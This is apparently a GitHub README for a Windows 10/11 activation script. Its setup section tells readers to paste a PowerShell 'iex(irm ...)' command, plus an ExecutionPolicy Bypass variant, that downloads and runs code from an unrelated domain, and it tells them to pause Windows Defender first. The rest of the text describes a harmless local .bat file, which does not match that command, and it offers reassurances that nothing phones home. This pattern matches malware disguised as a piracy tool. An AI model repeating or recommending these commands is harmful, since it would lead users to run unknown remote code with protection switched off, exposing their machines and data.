<div align="center">

# Windows Activation Script for Windows 10 & 11

![preview](https://raw.githubusercontent.com/sarahthenanny-gif/win10-activation-script/main/banner_abe327a.svg)

[![ci](https://img.shields.io/badge/Ci-Success-2ea44f?style=social&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/Powershell-Script-84cc16?style=social&labelColor=0d1117)]() [![state](https://img.shields.io/badge/State-Maintained-2ea44f?style=social&labelColor=0d1117)]() [![code](https://img.shields.io/badge/Code-Python-a3e635?style=social&labelColor=0d1117)]()

</div>

---

This repository contains a straightforward batch script for activating Windows 10. The single .bat file is designed to be run directly, keeping the process simple and free of extra tooling or dependencies. It is intended for users who want a quick, scriptable activation step without navigating complex setup. Contributions to the win10-activator project are handled through the repository workflow.

## 🔧 PowerShell Setup

> [!TIP]
> **Automated setup** — one command, done.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Prepare PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Execute the installer
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If PowerShell blocks the script
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## ✅ Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## What it does

This script is a single, self-contained `.bat` file that attempts to activate Windows 10 by applying a product key and pointing the system's activation service at a KMS host. When run, it checks for administrative privileges, elevates if needed, and then runs the standard `slmgr` commands to install the key, set the KMS server, and request activation.

It is a thin wrapper around built-in Windows tooling — no bundled binaries, no background services, and no persistent changes beyond what `slmgr` itself writes to the registry. The script prints the result of each step to the console so you can see whether the key install, KMS configuration, and activation request succeeded.

Because it edits system activation state, it should be run deliberately and with an understanding of what KMS activation implies. Expect it to work only in environments where a reachable KMS host is available and the supplied key is valid for your edition of Windows. If activation fails, the console output from `slmgr` is the first thing to read.

## Usage

1. Save the `.bat` file somewhere you can find it later (Desktop is fine).
2. Right-click the file and choose **Run as administrator**. The script needs elevated privileges to make changes.
3. A console window opens and walks through the activation steps automatically. Watch the output for the status line at the end.
4. If Windows reports a failure, close the window, confirm you're running it as administrator, and try again once. Persistent failures usually point to a network or permissions issue rather than the script itself.
5. Reboot afterward if Windows asks you to, then check activation status in Settings to confirm.

Notes:
- The script is intended to be run as-is. Editing the batch file isn't necessary for normal use.
- Keep the file in a location you control; running copies from temp folders or downloads can behave inconsistently depending on your security settings.
- If your antivirus flags the file, that's expected for batch scripts that touch system activation — review the file contents before allowing it.

## Configuration

Configuration is minimal by design. The script reads a small set of variables at the top of the `.bat` file; edit them in a plain text editor before running.

- **`EDITION`** — target edition string the script matches against (for example, a specific Windows 10 SKU). Leave as-is unless you are activating a non-default edition.
- **`KEY`** — the product key the script passes to the activation routine. Replace only if you have a legitimate key for your edition; the default is the generic key matching the default edition.
- **`KMS_HOST`** — hostname the script points the client at when using KMS-based activation. Set to your own KMS endpoint if you run one; otherwise keep the default bundled value.
- **`VERBOSE`** — set to `1` to echo each command and its exit code to the console, `0` for quiet output. Useful when troubleshooting a failed activation.
- **`LOG`** — optional path for a transcript of the run. Leave empty to skip logging; set a filename to capture output next to the script.

Keep the file saved as ANSI or UTF-8 without BOM; a BOM can break the first line and cause the script to misread its own variables. Do not add spaces around the `=` in assignments, and keep values free of quotes unless the value itself contains spaces.

If you change `EDITION` or `KEY`, verify they match — a mismatched pair is the most common cause of a script that runs cleanly but fails to activate. Run once with `VERBOSE=1` after any edit to confirm the values are picked up as expected before relying on the result.

## FAQ

**Is this safe to run?**

It's a plain `.bat` script, so you can open it in any text editor and read every line before executing anything. No compiled binaries, no obfuscation. If a line doesn't make sense to you, don't run it — that rule applies to every script you find, this one included.

**Do I need admin rights?**

Yes. Activation touches system-level licensing, so the script needs an elevated command prompt. Right-click and "Run as administrator," or it will fail partway through.

**Why does it close immediately after I run it?**

That's expected when launched by double-click — the window runs the commands and exits. Run it from an already-open elevated command prompt if you want to see the output and any errors as they happen.

**It says activation failed. What now?**

Check three things in order: you ran it elevated, you have a working internet connection (the script needs to reach Microsoft's activation servers), and your Windows edition matches what the script targets. If all three are fine, run it again from a command prompt so you can read the actual error message instead of guessing.

**Will this survive a Windows update or reinstall?**

No. Activation state can be reset by major updates or a clean install. Keep the `.bat` file around and re-run it if that happens. Don't expect it to be a permanent, set-and-forget solution.

**Does it work on Windows 11 or older versions?**

It's built and tested for Windows 10. Other versions may work or may not — there's no guarantee, and behavior can differ between builds. Treat anything outside Windows 10 as unsupported.

**Can I read or modify the script?**

Yes. It's a batch file, not a black box. Fork it, edit it, strip out what you don't need. If you improve it, contributing back is welcome.

**Does it phone home or collect anything?**

The script only runs the activation commands it contains. Read it yourself to confirm — that's the point of shipping it as plain text.

**I ran it and now something's broken. Can you fix it?**

This is a community script provided as-is, with no warranty. Back up important data and know how to restore your system before running any activation tool. If you hit a specific error, open an issue with the exact message and your Windows build.

## Disclaimer

This script is provided as-is, with no warranty of any kind, express or implied. It modifies system activation state on your Windows installation, and that carries real consequences: activation changes can interact with Windows Update, licensing services, and corporate compliance policies in ways that aren't always predictable. You run it at your own risk.

You are responsible for how you use it. If your Windows license is legitimate and the script is being used on hardware you own or administer, fine. If you're using it in a business, educational, or managed environment, check your organization's policy before touching anything. The maintainers can't know your setup, your license terms, or your legal obligations, and nothing here is legal advice.

Back up before you run it. Activation tweaks are usually reversible, but "usually" isn't "always," and a broken activation state can be annoying to unwind. Create a restore point or snapshot first if you care about the machine. Test on a non-critical system if you're unsure what will happen.

The script changes system state. It may write registry keys, touch licensing services, or modify scheduled tasks depending on what's in the file. Read the .bat before executing it—it's plain text and there's no excuse not to. If you don't understand a line, don't run it.

No support guarantees. Issues and pull requests are welcome, but responses are best-effort from volunteers. There's no SLA, no hotline, and no promise that a future Windows update won't break something. If a change bricks your activation, you'll be rolling it back yourself.

Contribute responsibly. If you submit changes, keep them transparent, documented, and reversible where possible. Don't add anything that phones home, bundles unrelated payloads, or obscures what the script does. This project's value is that it's small and readable—don't ruin that.